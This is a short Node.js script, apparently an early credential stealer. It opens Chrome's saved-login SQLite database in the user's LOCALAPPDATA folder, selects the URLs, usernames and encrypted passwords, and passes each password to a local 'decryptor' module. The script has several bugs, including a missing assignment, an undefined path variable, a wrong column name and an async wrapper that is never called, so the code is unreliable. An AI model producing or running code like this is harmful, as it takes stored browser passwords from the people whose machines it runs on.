const fs = require('fs'),
		p = require('path'),
		s = require('sqlite3').verbose(),
		pwnd = require("./decryptor");

const local process.env.LOCALAPPDATA;

var pass_path = p.join(
	local,
	"Google",
	"Chrome",
	"User Data",
	"Default",
	"Login Data For Account"
);

(async () => {
		try {
				let db = await s.Database(p.normalize(pass_path_, (e) => {
						if (e) return console.error(e);
						console.log('Connected to Database');
				}));

				db.serialize(async () => {
					db.each(
							"SELECT action_url, username_value, password_value FROM logins",
							async (e, row) => {
									if (e) return console.error(e);
										await console.log(`URL: ${row.action_url}`);
										await console.log(`Username: ${row.username}`);
										await console.log('Password Cipher: '+ row.password_value);

										console.time();
										// run func to decrypt.
										let enc = row.password_value;
										enc = await pwnd.fndEnc(enc);
										return await pwnd.decrypt(enc);
							}
					);
			 });
		} catch (e) {
			console.error(e);
		}
});
